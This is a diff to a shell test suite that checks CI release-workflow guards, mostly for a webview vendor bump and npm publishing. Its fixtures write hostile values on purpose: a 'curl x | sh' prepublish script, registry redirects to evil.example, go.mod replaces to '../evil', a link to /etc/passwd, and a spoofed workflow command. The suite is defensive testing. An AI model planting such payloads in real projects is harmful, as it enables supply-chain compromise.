+		"$SDU" "${SDU}          bash packaging/macos/x"$'\n' \
+		'sign-sidecar-darwin: step Unpack the bundles runs bash, which is not on the sign-sidecar-darwin list'
+	expect_caught 'zsh -f running a repository file in the macOS signer (#870 review)' runs "$WORKFLOWS/sidecar-release.yml" \
+		"$SDU" "${SDU}          zsh -f packaging/macos/x"$'\n' \
+		'sign-sidecar-darwin: step Unpack the bundles runs zsh, which is not on the sign-sidecar-darwin list'
+	expect_caught 'osascript running a repository script in the macOS signer (#870 review)' runs "$WORKFLOWS/sidecar-release.yml" \
+		"$SDU" "${SDU}          osascript packaging/macos/x.applescript"$'\n' \
+		'sign-sidecar-darwin: step Unpack the bundles runs osascript, which is not on the sign-sidecar-darwin list'
+	expect_caught 'arch running a repository file in the macOS signer (#870 review)' runs "$WORKFLOWS/sidecar-release.yml" \
+		"$SDU" "${SDU}          arch -arm64 packaging/macos/x"$'\n' \
+		'sign-sidecar-darwin: step Unpack the bundles runs arch, which is not on the sign-sidecar-darwin list'
+	expect_caught 'env -S running a repository file in the macOS signer (#870 review)' runs "$WORKFLOWS/sidecar-release.yml" \
+		"$SDU" "${SDU}          /usr/bin/env -S packaging/macos/x"$'\n' \
+		'sign-sidecar-darwin: step Unpack the bundles runs /usr/bin/env, which is not a plain command name this rule can check'
+	expect_caught 'xattr writing to the bundle in the macOS signer (#870 review)' runs "$WORKFLOWS/sidecar-release.yml" \
+		"$SDU" "${SDU}          xattr -w com.example.x y \"\${RUNNER_TEMP}/work\""$'\n' \
+		'sign-sidecar-darwin: step Unpack the bundles runs xattr, which is not on the sign-sidecar-darwin list'
+	expect_caught 'codesign run in a form not listed in the installer signer (#870 review)' runs "$WORKFLOWS/installer-release.yml" \
+		'          codesign --verify --strict --verbose=2 "$APP"' '          codesign --verify --strict --verbose=2 "$APP" --entitlements /tmp/x' \
+		'which is not one of the forms listed for codesign'
+	expect_caught 'another job handed the Apple secrets with no list of its own (#870 review)' runs "$WORKFLOWS/installer-release.yml" \
+		$'\njobs:\n' $'\njobs:\n  sneak:\n    runs-on: macos-latest\n    permissions:\n      contents: read\n    steps:\n      - run: echo x\n        env:\n          K: ${{ secrets.ASC_API_KEY_P8 }}\n' \
+		'sneak: reads the Apple signing secrets and has no list of the commands it may run'
 }
 
 echo
@@ -3225,10 +4455,10 @@ await Bun.write(process.env.TO, s.replace(old, "    timeout-minutes: 30\n    per
 		$'        with:\n          persist-credentials: false\n      - uses: actions/setup-go@' '      - uses: actions/setup-go@' \
 		'build: checkout leaves the token in .git/config'
 	expect_caught 'a read-only job persisting a secret it checked out with (#982)' narrow "$WORKFLOWS/docker-build.yml" \
-		$'\n\n      - name: Set up Docker Buildx\n' $'\n        with:\n          token: ${{ secrets.SOME_PAT }}\n\n      - name: Set up Docker Buildx\n' \
+		$'        with:\n          persist-credentials: false\n\n      - name: Set up Docker Buildx\n' $'        with:\n          token: ${{ secrets.SOME_PAT }}\n\n      - name: Set up Docker Buildx\n' \
 		'docker-build: checkout leaves the token in .git/config'
 	expect_caught 'the same checkout spelled in another case (#982)' narrow "$WORKFLOWS/docker-build.yml" \
-		$'      - uses: actions/checkout@' $'      - with:\n          token: ${{ secrets.SOME_PAT }}\n        uses: Actions/Checkout@' \
+		$'      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n        with:\n          persist-credentials: false\n' $'      - with:\n          token: ${{ secrets.SOME_PAT }}\n        uses: Actions/Checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n' \
 		'docker-build: checkout leaves the token in .git/config'
 	expect_caught 'the release branch pushed with no credential helper (#982)' narrow "$WORKFLOWS/release.yml" \
 		$'          GIT_CONFIG_KEY_1: credential.https://github.com.helper\n' '' \
@@ -3538,6 +4768,21 @@ const scripts = [
   [
     "set -euo pipefail",
     "in=\"$RUNNER_TEMP/webview-bump\"",
+    "files=\"$(find \"$in\" -type f | wc -l)\"",
+    "dirs=\"$(find \"$in\" -type d | wc -l)\"",
+    "if [ \"$files\" -gt 100 ] || [ \"$dirs\" -gt 50 ]; then",
+    "echo \"::error::the webview-bump artifact holds more than 100 files or 50 directories (#1049)\"",
+    "exit 1",
+    "fi",
+    "sizes=\"$(find \"$in\" -type f -printf \x27%s\\n\x27)\"",
+    "bytes=0",
+    "while read -r size; do",
+    "bytes=$((bytes + size))",
+    "done <<<\"$sizes\"",
+    "if [ \"$bytes\" -gt 8388608 ]; then",
+    "echo \"::error::the webview-bump artifact holds more than 8 MiB (#1049)\"",
+    "exit 1",
+    "fi",
     "if [ -n \"$(find \"$in\" -mindepth 1 -not -type f -not -type d -print -quit)\" ]; then",
     "echo \"::error::the webview-bump artifact holds something other than files and directories\"",
     "exit 1",
@@ -3556,6 +4801,58 @@ const scripts = [
     "fi",
     "if [ \"$(cat \"$in/webview_go/UPSTREAM_VERSION\" 2>/dev/null)\" != \"$VERSION\" ]; then",
     "echo \"::error::the vendored tree records another version than ${VERSION}\"",
+    "exit 1",
+    "fi",
+    "top=\"$(find \"$in/webview_go\" -mindepth 1 -maxdepth 1 -printf \x27%y %f\\n\x27)\"",
+    "libs=\"$(find \"$in/webview_go\" -mindepth 2 -type f -printf \x27%P\\n\x27)\"",
+    "while read -r kind name; do",
+    "case \"$kind $name\" in",
+    "\"d libs\" | \"f go.mod\" | \"f go.sum\" | \"f UPSTREAM_VERSION\" | \"f JARVIS_PATCH.md\" | \"f jarvis.patch\" | \"f .gitattributes\" | \"f LICENSE\") ;;",
+    "\"f \"*_test.go) echo \"::error::the vendored tree holds ${name}, a test file vendor-webview.sh does not copy (#1049)\"; exit 1 ;;",
+    "\"f \"*.go | \"f \"*.cc | \"f \"*.c | \"f \"*.h) ;;",
+    "*) echo \"::error::the vendored tree holds ${name}, which vendor-webview.sh does not copy (#1049)\"; exit 1 ;;",
+    "esac",
+    "done <<<\"$top\"",
+    "while read -r name; do",
+    "case \"$name\" in",
+    "\"\" | libs/*_test.go) [ -z \"$name\" ] || { echo \"::error::the vendored tree holds ${name}, a test file (#1049)\"; exit 1; } ;;",
+    "libs/*.h | libs/*.go | libs/*.txt | libs/*/LICENSE) ;;",
+    "*) echo \"::error::the vendored tree holds ${name}, which is not a header, Go file, text or license under libs/ (#1049)\"; exit 1 ;;",
+    "esac",
+    "done <<<\"$libs\"",
+    "for f in .gitattributes jarvis.patch JARVIS_PATCH.md; do",
+    "if ! cmp -s \"$in/webview_go/$f\" \"sidecar/third_party/webview_go/$f\"; then",
+    "echo \"::error::the bump changes ${f}, which vendor-webview.sh keeps from main (#1049)\"",
+    "exit 1",
+    "fi",
+    "done",
+    "if [ -n \"$(find \"$in/webview_go\" -mindepth 2 -iname \x27.git*\x27 -print -quit)\" ]; then",
+    "echo \"::error::the vendored tree holds a .git file below its top, such as a .gitattributes (#1049)\"",
+    "exit 1",
+    "fi",
+    "if ! cmp -s \"$in/go.sum\" sidecar/go.sum; then",
+    "echo \"::error::the bumped sidecar/go.sum differs from main (#1049)\"",
+    "exit 1",
+    "fi",
+    "if [ ! -f \"$in/webview_go/go.mod\" ]; then",
+    "echo \"::error::the vendored tree holds no go.mod (#1049)\"",
+    "exit 1",
+    "fi",
+    "directives() {",
+    "awk \x27{ sub(/\\/\\/.*/, \"\") } NF == 0 { next } { $1 = $1 } $0 == \")\" { block = \"\"; next } NF == 2 && $2 == \"(\" { block = $1; next } block != \"\" { print block \" \" $0; next } { print }\x27 \"$1\" | LC_ALL=C sort",
+    "}",
+    "main_mod=\"$(directives sidecar/go.mod)\"",
+    "new_mod=\"$(directives \"$in/go.mod\")\"",
+    "if [ \"$new_mod\" != \"$main_mod\" ]; then",
+    "echo \"::error::the bumped sidecar/go.mod differs from main in its directives (#1049):\"",
+    "diff <(printf \x27%s\\n\x27 \"$main_mod\") <(printf \x27%s\\n\x27 \"$new_mod\") | cat -v || true",
+    "exit 1",
+    "fi",
+    "main_mod=\"$(directives sidecar/third_party/webview_go/go.mod | awk \x27$1 != \"go\" && $1 != \"require\"\x27)\"",
+    "new_mod=\"$(directives \"$in/webview_go/go.mod\" | awk \x27$1 != \"go\" && $1 != \"require\"\x27)\"",
+    "if [ \"$new_mod\" != \"$main_mod\" ]; then",
+    "echo \"::error::the vendored go.mod differs from main in a directive other than go and require (#1049):\"",
+    "diff <(printf \x27%s\\n\x27 \"$main_mod\") <(printf \x27%s\\n\x27 \"$new_mod\") | cat -v || true",
     "exit 1",
     "fi",
     "rm -rf sidecar/third_party/webview_go",
@@ -3706,20 +5003,30 @@ const st = (d.jobs?.publish?.steps ?? []).find((s) => s.name === "Put the vendor
 if (!st || typeof st.run !== "string") process.exit(2);
 process.stdout.write(st.run);
 ')" || COPY_STEP=""
+REAL_SIDECAR="${HERE}/../../sidecar"
 # copy_case <label> <ok|refused> <shell run in the artifact dir to shape it>
 copy_case() {
 	local label="$1" want="$2" shape="$3" d="${WORK}/wvcopy"
 	rm -rf "$d" && mkdir -p "$d/ws/sidecar/third_party/webview_go/libs" "$d/tmp/webview-bump/webview_go/libs/webview"
 	printf 'old\n' >"$d/ws/sidecar/third_party/webview_go/dropped.go"
-	printf 'old attrs\n' >"$d/ws/sidecar/third_party/webview_go/.gitattributes"
-	printf 'module old\n' >"$d/ws/sidecar/go.mod"
-	printf 'old sum\n' >"$d/ws/sidecar/go.sum"
+	# The files vendor-webview.sh keeps, as main has them, on both sides.
+	for f in .gitattributes jarvis.patch JARVIS_PATCH.md; do
+		cp "$REAL_SIDECAR/third_party/webview_go/$f" "$d/ws/sidecar/third_party/webview_go/$f"
+		cp "$REAL_SIDECAR/third_party/webview_go/$f" "$d/tmp/webview-bump/webview_go/$f"
+	done
+	# The module files as main has them (#1049): the step compares the
+	# artifact with these, directive for directive.
+	cp "$REAL_SIDECAR/go.mod" "$d/ws/sidecar/go.mod"
+	cp "$REAL_SIDECAR/third_party/webview_go/go.mod" "$d/ws/sidecar/third_party/webview_go/go.mod"
+	cp "$REAL_SIDECAR/go.sum" "$d/ws/sidecar/go.sum"
 	printf 'package webview\n' >"$d/tmp/webview-bump/webview_go/webview.go"
-	printf '* -text\n' >"$d/tmp/webview-bump/webview_go/.gitattributes"
 	printf 'v1.2.3\n' >"$d/tmp/webview-bump/webview_go/UPSTREAM_VERSION"
 	printf 'header\n' >"$d/tmp/webview-bump/webview_go/libs/webview/webview.h"
-	printf 'module new\n' >"$d/tmp/webview-bump/go.mod"
-	printf 'new sum\n' >"$d/tmp/webview-bump/go.sum"
+	cp "$REAL_SIDECAR/third_party/webview_go/go.mod" "$d/tmp/webview-bump/webview_go/go.mod"
+	# Same directives, written differently (a comment, spacing), so the
+	# accepted copy still shows go.mod is replaced.
+	{ printf '// go mod tidy\n'; sed 's/^go \(.*\)$/go   \1   \/\/ toolchain line/' "$REAL_SIDECAR/go.mod"; } >"$d/tmp/webview-bump/go.mod"
+	cp "$REAL_SIDECAR/go.sum" "$d/tmp/webview-bump/go.sum"
 	(cd "$d/tmp/webview-bump" && eval "$shape") || {
 		no "webview copy: ${label} (the fixture could not be shaped)"
 		return
@@ -3733,6 +5040,11 @@ copy_case() {
 		cmp -s "$d/tmp/webview-bump/go.mod" "$d/ws/sidecar/go.mod" && cmp -s "$d/tmp/webview-bump/go.sum" "$d/ws/sidecar/go.sum" && ok_=1 ;;
 	refused) [ "$rc" -ne 0 ] && grep -q '^::error::' "$d/log" && diff -r "$d/before" "$d/ws" >/dev/null && ok_=1 ;;
 	esac
+	# A #1049 case is refused by a #1049 check, or by the one it names,
+	# not by whatever else happens to fail (security review of #1049).
+	local reason="${4:-}"
+	[ -z "$reason" ] && [[ "$label" == *"(#1049"* ]] && reason="(#1049)"
+	if [ "$want" = refused ] && [ -n "$reason" ] && ! grep -qF -- "$reason" "$d/log"; then ok_=0; fi
 	if [ "$ok_" = 1 ]; then ok "webview copy: ${label}"; else no "webview copy: ${label}" "exit ${rc}; log: $(cat "$d/log")"; fi
 }
 if [ -z "$COPY_STEP" ]; then
@@ -3752,6 +5064,52 @@ else
 	copy_case 'a name with a space in it is refused' refused 'printf x >"webview_go/a b.go"'
 	copy_case 'a tree recording another version is refused' refused 'printf "v9.9.9\n" >webview_go/UPSTREAM_VERSION'
 	copy_case 'a tree recording no version is refused' refused 'rm webview_go/UPSTREAM_VERSION'
+	# #1049: the content of the artifact, not only its shape.
+	copy_case 'the committed vendor tree, as a re-vendor of the pinned version gives it, is accepted (#1049)' ok \
+		'rm -r webview_go && cp -R "$REAL_SIDECAR/third_party/webview_go" webview_go && printf "v1.2.3\n" >webview_go/UPSTREAM_VERSION && cp "$REAL_SIDECAR/go.mod" "$REAL_SIDECAR/go.sum" .'
+	copy_case 'a new replace in sidecar/go.mod is refused (#1049)' refused 'printf "replace golang.org/x/sys => ../evil\n" >>go.mod'
+	copy_case 'a new replace inside a block is refused (#1049)' refused 'printf "replace (\n\tgolang.org/x/sys => ../evil\n)\n" >>go.mod'
+	copy_case 'the existing replace pointed elsewhere is refused (#1049)' refused 'sed -i "s|=> ./third_party/webview_go|=> ../evil|" go.mod'
+	copy_case 'a toolchain directive is refused (#1049)' refused 'printf "toolchain go1.99.0\n" >>go.mod'
+	copy_case 'a tool directive is refused (#1049)' refused 'printf "tool evil.example/x\n" >>go.mod'
+	copy_case 'a godebug directive is refused (#1049)' refused 'printf "godebug x509sha1=1\n" >>go.mod'
+	copy_case 'a moved go directive is refused (#1049)' refused 'sed -i "s/^go   .*/go 1.99.0/" go.mod'
+	copy_case 'a require block turned into an exclude block is refused (#1049)' refused 'sed -i "s/^require (/exclude (/" go.mod && grep -q "^exclude (" go.mod'
+	copy_case 'a new require is refused (#1049)' refused 'printf "require evil.example/x v1.0.0\n" >>go.mod'
+	copy_case 'a require moved to another version inside the block is refused (#1049)' refused 'sed -i "s|golang.org/x/sys v[0-9.]*|golang.org/x/sys v0.1.0|" go.mod && grep -q "x/sys v0.1.0" go.mod'
+	copy_case 'a replace in the vendored go.mod is refused (#1049)' refused 'printf "replace golang.org/x/sys => ../evil\n" >>webview_go/go.mod'
+	copy_case 'a vendored tree with no go.mod is refused (#1049)' refused 'rm webview_go/go.mod' 'holds no go.mod'
+	copy_case 'a vendored go.mod with no module line is refused (#1049)' refused 'sed -i "/^module/d" webview_go/go.mod' 'the vendored go.mod differs'
+	copy_case 'a vendored go.mod moving its own go line is accepted (#1049)' ok 'sed -i "s/^go .*/go 1.21/" webview_go/go.mod'
+	copy_case 'a build script at the top of the vendored tree is refused (#1049)' refused 'printf "#!/bin/sh\n" >webview_go/build.sh'
+	copy_case 'a test file at the top of the vendored tree is refused (#1049)' refused 'printf "package webview\n" >webview_go/webview_test.go'
+	copy_case 'an upstream README at the top of the vendored tree is refused (#1049)' refused 'printf x >webview_go/README.md'
+	copy_case 'a directory other than libs at the top of the vendored tree is refused (#1049)' refused 'mkdir webview_go/examples && printf x >webview_go/examples/main.go'
+	copy_case 'a new C source is accepted (#1049)' ok 'printf "int x;\n" >webview_go/extra.c'
+	copy_case 'a license under another name is for a person to take (#1049 review)' refused 'printf x >webview_go/LICENSE-THIRD-PARTY' 'holds LICENSE-THIRD-PARTY'
+	# Security review of #1049: built files under a license name, files
+	# the script keeps, hidden diffs, go.sum, directories, a carriage return,
+	# and go.mod spellings the normaliser must not read as main.
+	copy_case 'a LICENSE.syso, which Go links by its extension, is refused (#1049 review)' refused 'printf x >webview_go/LICENSE.syso' 'holds LICENSE.syso'
+	copy_case 'a LICENSE_windows_amd64.syso is refused (#1049 review)' refused 'printf x >webview_go/LICENSE_windows_amd64.syso' 'holds LICENSE_windows_amd64.syso'
+	copy_case 'a LICENSE_test.go is refused (#1049 review)' refused 'printf "package webview\n" >webview_go/LICENSE_test.go' 'holds LICENSE_test.go'
+	copy_case 'a .syso under libs is refused (#1049 review)' refused 'printf x >webview_go/libs/webview/evil_windows_amd64.syso' 'holds libs/webview/evil_windows_amd64.syso'
+	copy_case 'assembly under libs is refused (#1049 review)' refused 'printf x >webview_go/libs/webview/evil.S' 'holds libs/webview/evil.S'
+	copy_case 'a test file under libs is refused (#1049 review)' refused 'printf "package webview\n" >webview_go/libs/webview/x_test.go' 'a test file'
+	copy_case 'a changed .gitattributes is refused (#1049 review)' refused 'printf "*.go -diff linguist-generated=true\n" >>webview_go/.gitattributes' 'changes .gitattributes'
+	copy_case 'a changed jarvis.patch is refused (#1049 review)' refused 'printf "\n" >>webview_go/jarvis.patch' 'changes jarvis.patch'
+	copy_case 'a changed JARVIS_PATCH.md is refused (#1049 review)' refused 'printf "\n" >>webview_go/JARVIS_PATCH.md' 'changes JARVIS_PATCH.md'
+	copy_case 'a .gitattributes under libs is refused (#1049 review)' refused 'printf "* -diff\n" >webview_go/libs/.gitattributes'
+	copy_case 'a header inside a .git-named directory under libs is refused (#1049 review)' refused 'mkdir -p webview_go/libs/.gitmodules.d && printf x >webview_go/libs/.gitmodules.d/a.h' 'a .git file below its top'
+	copy_case 'a line added to go.sum is refused (#1049 review)' refused 'printf "evil.example/x v1.0.0 h1:AAAA=\n" >>go.sum' 'go.sum differs'
+	copy_case 'more than 50 directories is refused (#1049 review)' refused 'for i in $(seq 1 50); do mkdir "webview_go/libs/d$i"; done' '50 directories'
+	copy_case 'a CRLF go.mod is refused (#1049 review)' refused 'sed -i "s/\$/\r/" go.mod' 'sidecar/go.mod differs'
+	copy_case 'require( with no space is refused (#1049 review)' refused 'sed -i "s/^require (/require(/" go.mod' 'sidecar/go.mod differs'
+	copy_case 'a quoted module path is refused (#1049 review)' refused 'sed -i "s|github.com/google/uuid|\"github.com/google/uuid\"|" go.mod' 'sidecar/go.mod differs'
+	copy_case 'a workflow command after a carriage return is printed inert (#1049 review)' refused 'printf "toolchain go1.25.0\r::warning title=ok::bump checks passed\n" >>go.mod' 'toolchain go1.25.0^M::warning'
+	copy_case 'more than 100 files is refused (#1049)' refused 'for i in $(seq 1 100); do printf x >"webview_go/libs/f$i.h"; done'
+	copy_case 'more than 8 MiB is refused (#1049)' refused 'head -c 8388609 /dev/zero >webview_go/libs/big.h'
+	copy_case 'a 7 MiB header is accepted (#1049)' ok 'head -c 7340032 /dev/zero >webview_go/libs/big.h'
 	# copy_mutant <label> <exact text> <replacement> <copy_case arguments...>
 	copy_mutant() {
 		local label="$1" old="$2" new="$3"
@@ -3770,20 +5128,310 @@ else
 			'a link inside the vendored tree is refused' refused 'ln -s /etc/passwd webview_go/libs/evil.h'
 		copy_mutant 'the webview copy taking a .git (#983)' \
 			'-iname .git -print -quit' '-iname .nothing -print -quit' \
-			'a nested .git directory is refused' refused 'mkdir -p webview_go/libs/.git/hooks && printf x >webview_go/libs/.git/hooks/pre-commit'
+			'a nested .git directory is refused' refused 'mkdir -p webview_go/libs/.git/hooks && printf x >webview_go/libs/.git/hooks/pre-commit' 'holds a .git'
 		copy_mutant 'the webview copy taking any shape of artifact (#983)' \
 			'if [ "$(find "$in" -mindepth 1 -maxdepth 1 | wc -l)" != 3 ] || [ ! -f "$in/go.mod" ] || [ ! -f "$in/go.sum" ] || [ ! -d "$in/webview_go" ]; then' 'if false; then' \
 			'an extra file beside the tree is refused' refused 'printf x >evil.sh'
 		copy_mutant 'the webview copy matching .git in one case only (review of #983)' \
 			'-iname .git -print -quit' '-name .git -print -quit' \
-			'a .GIT directory, which a case-insensitive git reads as .git, is refused' refused 'mkdir -p webview_go/libs/.GIT/hooks && printf x >webview_go/libs/.GIT/hooks/post-checkout'
+			'a .GIT directory, which a case-insensitive git reads as .git, is refused' refused 'mkdir -p webview_go/libs/.GIT/hooks && printf x >webview_go/libs/.GIT/hooks/post-checkout' 'holds a .git'
 		copy_mutant 'the webview copy taking any name (review of #983)' \
 			"-name '*[!A-Za-z0-9._+-]*' -print -quit" '-false -print -quit' \
 			'a name with a space in it is refused' refused 'printf x >"webview_go/a b.go"'
+		copy_mutant 'the webview copy with no size cap (#1049)' \
+			'[ "$bytes" -gt 8388608 ]' '[ "$bytes" -gt 999999999999 ]' \
+			'more than 8 MiB is refused (#1049)' refused 'head -c 8388609 /dev/zero >webview_go/libs/big.h'
+		copy_mutant 'the webview copy with no file count cap (#1049)' \
+			'[ "$files" -gt 100 ]' '[ "$files" -gt 100000 ]' \
+			'more than 100 files is refused (#1049)' refused 'for i in $(seq 1 100); do printf x >"webview_go/libs/f$i.h"; done'
+		copy_mutant 'the webview copy taking any top-level file (#1049)' \
+			'*) echo "::error::the vendored tree holds ${name}, which vendor-webview.sh does not copy (#1049)"; exit 1 ;;' '*) ;;' \
+			'a build script at the top of the vendored tree is refused (#1049)' refused 'printf "#!/bin/sh\n" >webview_go/build.sh'
+		copy_mutant 'the webview copy taking a top-level test file (#1049)' \
+			'"f "*_test.go) echo' '"f "*_nothing.go) echo' \
+			'a test file at the top of the vendored tree is refused (#1049)' refused 'printf "package webview\n" >webview_go/webview_test.go'
+		copy_mutant 'the webview copy not comparing sidecar/go.mod (#1049)' \
+			'new_mod="$(directives "$in/go.mod")"' 'new_mod="$main_mod"' \
+			'a new replace in sidecar/go.mod is refused (#1049)' refused 'printf "replace golang.org/x/sys => ../evil\n" >>go.mod'
+		copy_mutant 'the webview copy blind to block entries (#1049)' \
+			'block != "" { print block " " $0; next }' 'block != "" { next }' \
+			'a require moved to another version inside the block is refused (#1049)' refused 'sed -i "s|golang.org/x/sys v[0-9.]*|golang.org/x/sys v0.1.0|" go.mod && grep -q "x/sys v0.1.0" go.mod'
+		copy_mutant 'the webview copy reading a block entry without its keyword (#1049)' \
+			'block != "" { print block " " $0; next }' 'block != "" { print; next }' \
+			'a require block turned into an exclude block is refused (#1049)' refused 'sed -i "s/^require (/exclude (/" go.mod && grep -q "^exclude (" go.mod'
+		copy_mutant 'the webview copy not comparing the vendored go.mod (#1049)' \
+			'new_mod="$(directives "$in/webview_go/go.mod" | awk' 'new_mod="$(directives sidecar/third_party/webview_go/go.mod | awk' \
+			'a replace in the vendored go.mod is refused (#1049)' refused 'printf "replace golang.org/x/sys => ../evil\n" >>webview_go/go.mod'
+		copy_mutant 'LICENSE matched as a prefix again (#1049 review)' \
+			'| "f LICENSE") ;;' '| "f LICENSE"*) ;;' \
+			'a LICENSE.syso, which Go links by its extension, is refused (#1049 review)' refused 'printf x >webview_go/LICENSE.syso'
+		copy_mutant 'libs taking any file (#1049 review)' \
+			'libs/*.h | libs/*.go | libs/*.txt | libs/*/LICENSE) ;;' 'libs/*) ;;' \
+			'a .syso under libs is refused (#1049 review)' refused 'printf x >webview_go/libs/webview/evil_windows_amd64.syso'
+		copy_mutant 'the kept files taken as the artifact has them (#1049 review)' \
+			'for f in .gitattributes jarvis.patch JARVIS_PATCH.md; do' 'for f in; do' \
+			'a changed .gitattributes is refused (#1049 review)' refused 'printf "*.go -diff linguist-generated=true\n" >>webview_go/.gitattributes'
+		copy_mutant 'a .git name below the top let through (#1049 review)' \
+			"-mindepth 2 -iname '.git*' -print -quit" '-false -print -quit' \
+			'a header inside a .git-named directory under libs is refused (#1049 review)' refused 'mkdir -p webview_go/libs/.gitmodules.d && printf x >webview_go/libs/.gitmodules.d/a.h'
+		copy_mutant 'go.sum taken as the artifact has it (#1049 review)' \
+			'if ! cmp -s "$in/go.sum" sidecar/go.sum; then' 'if false; then' \
+			'a line added to go.sum is refused (#1049 review)' refused 'printf "evil.example/x v1.0.0 h1:AAAA=\n" >>go.sum'
+		copy_mutant 'no directory cap (#1049 review)' \
+			'[ "$dirs" -gt 50 ]' '[ "$dirs" -gt 50000 ]' \
+			'more than 50 directories is refused (#1049 review)' refused 'for i in $(seq 1 50); do mkdir "webview_go/libs/d$i"; done'
+		copy_mutant 'the go.mod difference printed raw (#1049 review)' \
+			'| cat -v || true' '|| true' \
+			'a workflow command after a carriage return is printed inert (#1049 review)' refused 'printf "toolchain go1.25.0\r::warning title=ok::bump checks passed\n" >>go.mod' 'toolchain go1.25.0^M::warning'
+		copy_mutant 'go.mod comments kept, so a tidy comment reads as a change (#1049 review)' \
+			'{ sub(/\/\/.*/, "") }' '{ }' \
+			'the vendored tree replaces the old one, its hidden file kept and a dropped file dropped' ok ':'
+		copy_mutant 'go.mod spacing kept, so reformatting reads as a change (#1049 review)' \
+			'{ $1 = $1 }' '{ }' \
+			'the vendored tree replaces the old one, its hidden file kept and a dropped file dropped' ok ':'
 		copy_mutant 'the webview copy taking a tree of another version (review of #983)' \
 			'!= "$VERSION" ]; then' '= x ]; then' \
 			'a tree recording another version is refused' refused 'printf "v9.9.9\n" >webview_go/UPSTREAM_VERSION'
 	}
+fi
+
+echo
+echo "publish-sidecar refuses npm config and package fields that change what npm runs (#1046)"
+# npm reads a .npmrc in the directory it runs from, and acts on package.json
+# fields such as scripts and publishConfig; the job holding id-token checks
+# its checkout for both before any npm command. The step, executed verbatim
+# against a copy of sidecar/npm, then against hostile copies of it.
+NPMRC_STEP_NAME="Refuse npm config and package fields that change what npm runs"
+NPMRC_STEP="$(FILE="$WORKFLOWS/sidecar-release.yml" NAME="$NPMRC_STEP_NAME" bun -e '
+const d = Bun.YAML.parse(await Bun.file(process.env.FILE).text());
+const st = (d.jobs?.["publish-sidecar"]?.steps ?? []).find((s) => s.name === process.env.NAME);
+if (!st || typeof st.run !== "string") process.exit(2);
+process.stdout.write(st.run);
+')" || NPMRC_STEP=""
+# npmrc_case <label> <ok|refused> <shell run in the fixture checkout to shape it>
+npmrc_case() {
+	local d="${WORK}/npmrc" rc=0 ok_=0
+	rm -rf "$d" && mkdir -p "$d/ws/sidecar" && cp -R "${HERE}/../../sidecar/npm" "$d/ws/sidecar/npm" || {
+		no "npm content: $1 (the fixture could not be made)"
+		return
+	}
+	(cd "$d/ws" && eval "$3") || {
+		no "npm content: $1 (the fixture could not be shaped)"
+		return
+	}
+	(cd "$d/ws" && env -i PATH="$PATH" bash -e -c "${NPMRC_STEP_UNDER_TEST:-$NPMRC_STEP}") >"$d/log" 2>&1 || rc=$?
+	case "$2" in
+	ok) [ "$rc" -eq 0 ] && ok_=1 ;;
+	refused) [ "$rc" -ne 0 ] && grep -q '^::error::.*(#1046)' "$d/log" && ok_=1 ;;
+	esac
+	if [ "$ok_" = 1 ]; then ok "npm content: $1"; else no "npm content: $1" "exit ${rc}; log: $(cat "$d/log")"; fi
+}
+# npmrc_field <package dir> <jq filter>: rewrite one fixture package.json.
+npmrc_field() { jq "$2" "sidecar/npm/$1/package.json" >pj.tmp && mv pj.tmp "sidecar/npm/$1/package.json"; }
+if [ -z "$NPMRC_STEP" ]; then
+	no "found sidecar-release.yml publish-sidecar: ${NPMRC_STEP_NAME}"
+else
+	npmrc_case 'the six packages as committed pass' ok ':'
+	npmrc_case 'a prepublishOnly script in a platform package is refused' refused 'npmrc_field linux-x64 ".scripts = {prepublishOnly: \"curl x | sh\"}"'
+	npmrc_case 'a version script in the wrapper package is refused' refused 'npmrc_field jarvis-sidecar ".scripts = {version: \"id\"}"'
+	npmrc_case 'an empty scripts object is refused' refused 'npmrc_field win32-x64 ".scripts = {}"'
+	npmrc_case 'a publishConfig that redirects the publish is refused' refused 'npmrc_field darwin-arm64 ".publishConfig = {registry: \"https://evil.example/\"}"'
+	npmrc_case 'a package.json that is not an object is refused' refused 'printf "[]\n" >sidecar/npm/darwin-x64/package.json'
+	npmrc_case 'a package.json that is not JSON is refused' refused 'printf "{\n" >sidecar/npm/linux-arm64/package.json'
+	npmrc_case 'a missing package.json is refused' refused 'rm sidecar/npm/linux-arm64/package.json'
+	npmrc_case 'a .npmrc beside a package is refused' refused 'printf "registry=https://evil.example/\n" >sidecar/npm/linux-x64/.npmrc'
+	npmrc_case 'a .npmrc at the root of the checkout is refused' refused 'printf "registry=https://evil.example/\n" >.npmrc'
+	npmrc_case 'a .npmrc anywhere in the checkout is refused' refused 'mkdir -p ui/x && printf "x=1\n" >ui/x/.npmrc'
+	npmrc_case 'a .npmrc that is a directory is refused' refused 'mkdir sidecar/npm/win32-x64/.npmrc'
+	# Security review of #1046: links, extra files, and the values.
+	npmrc_case 'a bin link to its own package, which an artifact would unpack a .npmrc through, is refused' refused 'ln -s . sidecar/npm/darwin-arm64/bin'
+	npmrc_case 'a package.json that is a link to a benign file is refused' refused 'mkdir sidecar/npm/linux-x64/bin && mv sidecar/npm/linux-x64/package.json sidecar/npm/linux-x64/bin/p.json && ln -s bin/p.json sidecar/npm/linux-x64/package.json'
+	npmrc_case 'sidecar/npm as a link is refused' refused 'mv sidecar/npm sidecar/real && ln -s real sidecar/npm'
+	npmrc_case 'an extra file in a package is refused' refused 'printf x >sidecar/npm/win32-x64/README.md'
+	npmrc_case 'a package.json above the packages is refused' refused 'printf "{\"workspaces\": [\"*\"]}\n" >sidecar/npm/package.json'
+	npmrc_case 'a platform package renamed to the wrapper is refused' refused 'npmrc_field linux-x64 ".name = \"@usejarvis/sidecar\""'
+	npmrc_case 'a platform package renamed to the brain is refused' refused 'npmrc_field darwin-x64 ".name = \"@usejarvis/brain\""'
+	npmrc_case 'the wrapper renamed is refused' refused 'npmrc_field jarvis-sidecar ".name = \"@usejarvis/brain\""'
+	npmrc_case 'a platform package shipping more than bin is refused' refused 'npmrc_field linux-arm64 ".files = [\"bin\", \"lib\"]"'
+	npmrc_case 'a platform package with a bin field is refused' refused 'npmrc_field win32-x64 ".bin = {\"x\": \"bin/x\"}"'
+	npmrc_case 'the wrapper launching another file is refused' refused 'npmrc_field jarvis-sidecar ".bin = {\"jarvis\": \"bin/other\"}"'
+	npmrc_case 'the wrapper depending on another package is refused' refused 'npmrc_field jarvis-sidecar ".optionalDependencies[\"evil\"] = \"1.0.0\""'
+	npmrc_case 'the wrapper depending on a platform package by URL is refused' refused 'npmrc_field jarvis-sidecar ".optionalDependencies[\"@usejarvis/sidecar-linux-x64\"] = \"https://evil.example/x.tgz\""'
